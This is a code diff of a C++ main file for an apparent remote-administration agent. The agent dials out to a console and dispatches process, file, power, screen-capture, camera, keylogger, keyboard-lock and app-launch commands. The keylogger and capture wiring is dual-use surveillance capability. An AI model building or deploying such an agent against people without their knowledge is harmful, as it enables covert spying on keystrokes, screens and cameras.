@@ -2,18 +2,22 @@
 // structured logger, load the config file, and run the dial-out transport
 // loop - HTTP-style connect retries with bounded exponential backoff, then
 // the P3 agent session state machine (handshake, keepalive, seq correlation)
-// riding the TCP transport. Phase 6 adds the command surface (tasks 6.1-6.3):
-// the capability-matrix dispatcher runs behind each session, with the
-// process and file families live; verbs of the not-yet-implemented families
-// resolve through the same dispatcher to the structured unsupported result,
-// so the command set is already complete at this thin entry point.
+// riding the TCP transport. Phase 6 adds the command surface (tasks
+// 6.1-6.8): the capability-matrix dispatcher runs behind each session with
+// every family live - process, file, power, capture, camera (background
+// jobs over the shared registry), input (keylogger job in the same
+// registry + keyboard lock) and app (.lnk / .desktop launches) - so the
+// command set is already complete at this thin entry point.
+#include "app.hpp"
 #include "camera.hpp"
 #include "capture.hpp"
 #include "command_handler.hpp"
 #include "config.hpp"
+#include "input.hpp"
 #include "logging.hpp"
 #include "matrix.hpp"
 #include "power.hpp"
+#include "process.hpp"
 #include "session.hpp"
 #include "tcp.hpp"
 #include "transport.hpp"
@@ -77,13 +81,13 @@ int main(int argc, char* argv[]) {
     // "retries connection attempts at a bounded interval instead of exiting").
     const transport::DialPolicy policy{};
 
-    // Phase 6 (tasks 6.1-6.6): the closed-set dispatcher behind every
-    // session. Process, file, power, capture and camera families are live
-    // (camera through the shared background-job registry); input/app verbs
-    // resolve to the structured unsupported result until their family tasks
-    // land (6.7-6.8 route through this same object).
+    // Phase 6 (tasks 6.1-6.8): the closed-set dispatcher behind every
+    // session, every family live. ONE process control is shared across the
+    // process family and the app family (stop_app reuses it - see app.hpp).
+    const std::shared_ptr<tether::syscalls::IProcessControl> processes =
+        tether::syscalls::make_process_control();
     tether::syscalls::CommandDispatcher dispatcher;
-    dispatcher.set_process_control(tether::syscalls::make_process_control());
+    dispatcher.set_process_control(processes);
     dispatcher.set_file_system(tether::syscalls::make_file_system());
     // Task 6.4 power: Windows ExitWindowsEx behind the confirm gate; Linux
     // logind over D-Bus (dlopen'd sd-bus, no link-time dependency).
@@ -91,8 +95,17 @@ int main(int argc, char* argv[]) {
     // Task 6.5 capture: Windows GDI / Linux X11 -> PNG deliverable.
     dispatcher.set_screen_capture(tether::syscalls::make_screen_capture());
     // Task 6.6 camera: background jobs over cv::VideoCapture in the shared
-    // registry (the keylogger plugs into the same registry in task 6.7).
+    // registry.
     dispatcher.set_camera_capture(tether::syscalls::make_camera_capture());
+    // Task 6.7 input: the keylogger as a managed background job in the SAME
+    // agent-process-wide registry the camera uses (slot "input"), plus the
+    // reversible keyboard lock. Explicit console commands only: nothing in
+    // this family engages on its own, and the console's audit trail records
+    // both verbs (task 6.9).
+    dispatcher.set_input_control(tether::syscalls::make_input_control());
+    // Task 6.8 app: .lnk / .desktop entries resolved to ARGV and launched
+    // through the shared argv-based process control (stop_app, too).
+    dispatcher.set_app_launcher(tether::syscalls::make_app_launcher_with_processes(processes));
 
     for (;;) {
         std::unique_ptr<transport::TcpAgentLink> link;
